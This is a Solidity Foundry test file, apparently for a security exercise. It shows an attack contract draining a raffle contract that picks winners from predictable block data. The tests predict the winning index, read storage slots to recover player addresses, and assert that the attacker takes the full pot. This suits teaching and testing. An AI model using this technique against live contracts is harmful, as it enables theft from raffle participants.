// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utilities} from "./utils/Utilities.sol";

import {BadRNG} from "../src/BadRNG.sol";
import {Attack} from "../src/Attack.sol";

contract BadRNGTest is Test {
    Utilities internal utils;

    BadRNG internal badRNG;
    Attack internal attack;

    address payable constant attacker = payable(address(0x69));

    function setUp() public {
        /** SETUP SCENARIO */
        utils = new Utilities();

        badRNG = new BadRNG();
        vm.label(address(badRNG), "BadRNG");

        vm.deal(attacker, 30 ether);
        uint256 attackerStartingBalance = attacker.balance;
        emit log_named_uint(
            "attacker starting balance",
            attackerStartingBalance
        );

        vm.startPrank(attacker);
        attack = (new Attack){value: 12 ether}(badRNG);
        vm.stopPrank();

        uint256 attackerBalanceAfterFundingAttack = attacker.balance;
        emit log_named_uint(
            "attacker balance after funding attack contract",
            attackerBalanceAfterFundingAttack
        );

        uint256 attackContractFundedBalance = address(attack).balance;
        emit log_named_uint(
            "attack contract balance after being funded by attacker",
            attackContractFundedBalance
        );

        require(attack.owner() == attacker);
    }

    function testAttack() public {
        // Balances from `setUp`
        uint256 attackerStartingBalance = 30 ether;
        uint256 attackerBalanceAfterFundingAttack = 18 ether;
        uint256 attackContractFundedBalance = 12 ether;

        uint256 numberTotalUsers = 19;

        address payable[] memory users = utils.createUsers(numberTotalUsers);

        for (uint256 i = 0; i < 5; i++) {
            address payable user = users[i];
            vm.startPrank(user);
            (bool success, ) = address(badRNG).call{value: 10 ether}(
                abi.encodeWithSelector(badRNG.enterRaffle.selector)
            );
            vm.stopPrank();
            require(success, "enterRaffle_call_failed");
        }

        vm.startPrank(attacker);
        attack.enter();
        vm.stopPrank();

        for (uint256 i = 6; i < users.length; i++) {
            address payable user = users[i];
            vm.prank(user);
            (bool success, ) = address(badRNG).call{value: 10 ether}(
                abi.encodeWithSelector(badRNG.enterRaffle.selector)
            );
            require(success, "enterRaffle_call_failed");
        }

        uint256 raffleBalanceAfterAllEntries = address(badRNG).balance;
        emit log_named_uint(
            "raffle balance after all entries",
            raffleBalanceAfterAllEntries
        );

        vm.startPrank(attacker);
        badRNG.pickWinner();
        attack.withdraw();
        vm.stopPrank();

        uint256 attackContractBalanceAfterWithdrawal = address(attack).balance;
        emit log_named_uint(
            "attack contract balance after withdrawal",
            attackContractBalanceAfterWithdrawal
        );

        uint256 raffleBalanceAfterWinnerPicked = address(badRNG).balance;
        emit log_named_uint(
            "raffle balance after winner picked",
            raffleBalanceAfterWinnerPicked
        );

        uint256 attackerBalanceAfterDrainingAttack = attacker.balance;
        emit log_named_uint(
            "attacker balance after withdrawal from attack contract",
            attackerBalanceAfterDrainingAttack
        );

        assertEq(
            attackerStartingBalance,
            attackContractFundedBalance + attackerBalanceAfterFundingAttack
        );
        assertEq(raffleBalanceAfterAllEntries, numberTotalUsers * 10 ether);
        assertEq(attackContractBalanceAfterWithdrawal, 0);
        assertEq(raffleBalanceAfterWinnerPicked, 0);
        assertEq(
            attackerBalanceAfterDrainingAttack,
            raffleBalanceAfterAllEntries + attackerStartingBalance - 10 ether
        );
    }

    // Test for reading slot 0 of `BadRNG` (location of `s_player`). Expecting value of `numberUsers` (i.e. 10 currently).
    // Note: 10 is equivalent to 0x000000000000000000000000000000000000000000000000000000000000000a
    function testSlot() public {
        address payable[] memory users = utils.createUsers(10);

        // `users` entering raffle
        for (uint256 i = 0; i < users.length; i++) {
            address payable user = users[i];
            vm.prank(user);
            (bool success, ) = address(badRNG).call{value: 10 ether}(
                abi.encodeWithSelector(badRNG.enterRaffle.selector)
            );
            require(success, "enterRaffle_call_failed");
        }

        assertEq(
            0x000000000000000000000000000000000000000000000000000000000000000a,
            vm.load(address(badRNG), 0)
        );
    }

    // Run forge test -vvvvv --block-difficulty b (b = uint256) & check that the log emitted has block.difficulty = b.
    function testBlockDifficulty() public {
        emit log_named_uint("block_difficulty", block.difficulty);
    }

    function testSlotIndexToRetrieveAddress() public {
        uint256 numberUsers = 20;
        address payable[] memory users = generateUsersAndEnterRaffle(
            numberUsers
        );

        vm.startPrank(attacker);
        (uint256 randomWinnerIndex, uint256 index) = winnerIndex(numberUsers);
        vm.stopPrank();
        emit log_named_uint("randomWinnerIndex", randomWinnerIndex);
        emit log_named_uint("index", index);

        bytes32 data = vm.load(
            address(badRNG),
            getSlotBytesRepresentation(0, index)
        );
        address dataAddress = address(uint160(uint256(data)));
        emit log_named_bytes32("dataAtSlotBytes", data);
        emit log_named_address("dataAddress", dataAddress);

        assertEq(users[index], dataAddress);
    }

    function testFuzzSlotIndexToRetrieveAddress(uint256 numberUsers) public {
        vm.assume(numberUsers > 10 && numberUsers < 40);
        address payable[] memory users = generateUsersAndEnterRaffle(
            numberUsers
        );

        vm.startPrank(attacker);
        (uint256 randomWinnerIndex, uint256 index) = winnerIndex(numberUsers);
        vm.stopPrank();
        emit log_named_uint("randomWinnerIndex", randomWinnerIndex);
        emit log_named_uint("index", index);

        bytes32 data = vm.load(
            address(badRNG),
            getSlotBytesRepresentation(0, index)
        );
        address dataAddress = address(uint160(uint256(data)));
        emit log_named_bytes32("dataAtSlotBytes", data);
        emit log_named_address("dataAddress", dataAddress);

        assertEq(users[index], dataAddress);
    }

    // Helper functions
    function generateUsersAndEnterRaffle(uint256 numberTotalUsers)
        public
        returns (address payable[] memory users)
    {
        users = utils.createUsers(numberTotalUsers);

        for (uint256 i = 0; i < numberTotalUsers; i++) {
            address payable user = users[i];
            vm.startPrank(user);
            (bool success, ) = address(badRNG).call{value: 10 ether}(
                abi.encodeWithSelector(badRNG.enterRaffle.selector)
            );
            vm.stopPrank();
            require(success, "enterRaffle_call_failed");
        }

        return users;
    }

    function getSlotBytesRepresentation(uint256 _arraySlot, uint256 _index)
        public
        pure
        returns (bytes32 slotLocation)
    {
        uint256 slot = uint256(keccak256(abi.encodePacked(_arraySlot))) +
            _index;
        return bytes32(slot);
    }

    function retrieveAddressFromSlotIndex(uint256 index)
        public
        returns (address)
    {
        bytes32 data = vm.load(
            address(badRNG),
            getSlotBytesRepresentation(0, index)
        );
        return address(uint160(uint256(data)));
    }

    function winnerIndex(uint256 length)
        public
        view
        returns (uint256, uint256)
    {
        uint256 randomWinnerIndex = uint256(
            keccak256(abi.encodePacked(block.difficulty, attacker))
        );
        uint256 index = randomWinnerIndex % length;
        return (randomWinnerIndex, index);
    }
}
